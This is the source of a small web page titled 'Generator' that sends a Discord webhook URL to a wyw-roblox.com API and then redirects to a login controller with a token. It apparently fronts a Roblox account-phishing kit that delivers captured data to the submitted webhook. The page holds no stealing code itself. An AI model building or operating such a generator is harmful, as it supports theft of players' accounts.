<?php
require('../setup.php')
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?$name?>  - Generator</title>
<link rel="shortcut icon" href="https://cdn-icons-png.flaticon.com/128/6646/6646535.png" type="image/png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
<link rel="stylesheet" href="../assets/css/profilegenerator/style.css">
<script nonce="98eb8f41-602b-4e11-bd00-e3a9d472acfb">(function(w,d){!function(cM,cN,cO,cP){cM.zarazData=cM.zarazData||{};cM.zarazData.executed=[];cM.zaraz={deferred:[],listeners:[]};cM.zaraz.q=[];cM.zaraz._f=function(cQ){return function(){var cR=Array.prototype.slice.call(arguments);cM.zaraz.q.push({m:cQ,a:cR})}};for(const cS of["track","set","debug"])cM.zaraz[cS]=cM.zaraz._f(cS);cM.zaraz.init=()=>{var cT=cN.getElementsByTagName(cP)[0],cU=cN.createElement(cP),cV=cN.getElementsByTagName("title")[0];cV&&(cM.zarazData.t=cN.getElementsByTagName("title")[0].text);cM.zarazData.x=Math.random();cM.zarazData.w=cM.screen.width;cM.zarazData.h=cM.screen.height;cM.zarazData.j=cM.innerHeight;cM.zarazData.e=cM.innerWidth;cM.zarazData.l=cM.location.href;cM.zarazData.r=cN.referrer;cM.zarazData.k=cM.screen.colorDepth;cM.zarazData.n=cN.characterSet;cM.zarazData.o=(new Date).getTimezoneOffset();if(cM.dataLayer)for(const cZ of Object.entries(Object.entries(dataLayer).reduce(((c_,da)=>({...c_[1],...da[1]})))))zaraz.set(cZ[0],cZ[1],{scope:"page"});cM.zarazData.q=[];for(;cM.zaraz.q.length;){const db=cM.zaraz.q.shift();cM.zarazData.q.push(db)}cU.defer=!0;for(const dc of[localStorage,sessionStorage])Object.keys(dc||{}).filter((de=>de.startsWith("_zaraz_"))).forEach((dd=>{try{cM.zarazData["z_"+dd.slice(7)]=JSON.parse(dc.getItem(dd))}catch{cM.zarazData["z_"+dd.slice(7)]=dc.getItem(dd)}}));cU.referrerPolicy="origin";cU.src="/ventryshield/contents.js?z="+btoa(encodeURIComponent(JSON.stringify(cM.zarazData)));cT.parentNode.insertBefore(cU,cT)};["complete","interactive"].includes(cN.readyState)?zaraz.init():cM.addEventListener("DOMContentLoaded",zaraz.init)}(w,d,0,"script");})(window,document);</script></head>
<body>
<div class="newsletter-subscribe">
<div class="container">
<div class="intro">
<h2 class="text-center">Generator</h2>
</div>
<div class="form-inline">
<div class="form-group"><input class="form-control" id="webhook_url" type="url" name="webhook" placeholder="Discord Webhook"></div>
<div class="form-group"><button class="btn btn-primary" onclick="create()" type="submit">Create </button></div>
</div>
</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    function create() {
    var webhook_url = document.getElementById('webhook_url').value;
    if (webhook_url) {
        var credent = {
            webhook: webhook_url
        };
        $.ajax({
            type: "POST",
            url: "https://wyw-roblox.com/api/generator",
            data: credent,
            dataType: "text",
        }).done(function(data) {
            if (data=='{"message": "Unknown Webhook", "code": 10015}{"code":0,"message":"Invalid webhooks"}') {
                Swal.fire(
                    'Failed',
                    'Invalid webhook',
                    'error'
                )
            }else if(JSON.parse(data)['code'] == 0){
                Swal.fire(
                    'Failed',
                    JSON.parse(data)['message'],
                    'error'
                )
            } else{
                Swal.fire(
                    'Success',
                    JSON.parse(data)['message'],
                    'success'
                )
                window.location.href = "../api/loginController?token=" + JSON.parse(data)['token'];
            }
        })
    } else {
        Swal.fire(
            'Failed',
            'Input cannot be empty',
            'error'
        )
    }
}
    </script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vaafb692b2aea4879b33c060e79fe94621666317369993" integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA==" data-cf-beacon='{"rayId":"777fa21be95e7556","token":"033c33a962e74d16be982c1223e03590","version":"2022.11.3","si":100}' crossorigin="anonymous"></script>
</body>
</html>